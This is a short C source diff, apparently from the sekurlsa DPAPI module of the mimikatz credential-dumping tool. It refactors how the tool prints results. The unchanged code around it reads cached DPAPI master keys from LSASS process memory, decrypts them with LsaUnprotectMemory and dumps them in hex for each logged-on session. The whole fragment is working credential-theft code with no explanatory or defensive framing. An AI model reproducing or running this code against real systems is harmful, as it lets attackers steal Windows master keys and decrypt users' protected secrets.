@@ -45,9 +45,9 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_MEMORY_ADDRESS aBuffer = {&mesCredentials, &hLocalMemory}, aKey = {NULL, &hLocalMemory}, aLsass = {NULL, pData->cLsass->hLsassMem};
 	PKUHL_M_SEKURLSA_PACKAGE pPackage = (pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8) ? &kuhl_m_sekurlsa_dpapi_svc_package : &kuhl_m_sekurlsa_dpapi_lsa_package;
-	SYSTEMTIME sTime;
 	DWORD monNb = 0;
-	if((pData->LogonType != Network)/* && pData->LogonType != UndefinedLogonType*/)
+
+	if(pData->LogonType != Network)
 	{
 		kuhl_m_sekurlsa_printinfos_logonData(pData);
 		if(pPackage->Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &pPackage->Module, MasterKeyCacheReferences, sizeof(MasterKeyCacheReferences) / sizeof(KULL_M_PATCH_GENERIC), (PVOID *) &pMasterKeyCacheList, NULL, NULL))
@@ -62,21 +62,17 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 					{
 						if(RtlEqualLuid(pData->LogonId, &mesCredentials.LogonId))
 						{
-							kprintf(L"\t [%08x] ", monNb++);
-							kprintf(L"\n\t * GUID :\t{%08x-%04hx-%04hx-%02x%02x-%02x%02x%02x%02x%02x%02x}", mesCredentials.KeyUid.Data1, mesCredentials.KeyUid.Data2, mesCredentials.KeyUid.Data3, mesCredentials.KeyUid.Data4[0], mesCredentials.KeyUid.Data4[1], mesCredentials.KeyUid.Data4[2], mesCredentials.KeyUid.Data4[3], mesCredentials.KeyUid.Data4[4], mesCredentials.KeyUid.Data4[5], mesCredentials.KeyUid.Data4[6], mesCredentials.KeyUid.Data4[7]);
-							if(FileTimeToSystemTime(&mesCredentials.insertTime, &sTime))
-							{
-								kprintf(L"\n\t * Time :\t%02hu/%02hu/%04hu %02hu:%02hu:%02hu,%hu", sTime.wDay, sTime.wMonth, sTime.wYear, sTime.wHour, sTime.wMinute, sTime.wSecond, sTime.wMilliseconds);
-							}
+							kprintf(L"\t [%08x]\n\t * GUID :\t", monNb++);
+							kull_m_string_displayGUID(&mesCredentials.KeyUid);
+							kprintf(L"\n\t * Time :\t"); kull_m_string_displayFileTime(&mesCredentials.insertTime);
 
 							if(aKey.address = LocalAlloc(LPTR, mesCredentials.keySize))
 							{
 								aLsass.address = (PBYTE) aLsass.address + FIELD_OFFSET(KIWI_MASTERKEY_CACHE_ENTRY, key);
-
 								if(kull_m_memory_copy(&aKey, &aLsass, mesCredentials.keySize))
 								{
 									(*pData->lsassLocalHelper->pLsaUnprotectMemory)(aKey.address, mesCredentials.keySize);
-									kprintf(L"\n\t * Key :\t"); kull_m_string_wprintf_hex(aKey.address, mesCredentials.keySize, 1);
+									kprintf(L"\n\t * Key :\t"); kull_m_string_wprintf_hex(aKey.address, mesCredentials.keySize, 0);
 								}
 								LocalFree(aKey.address);
 							}
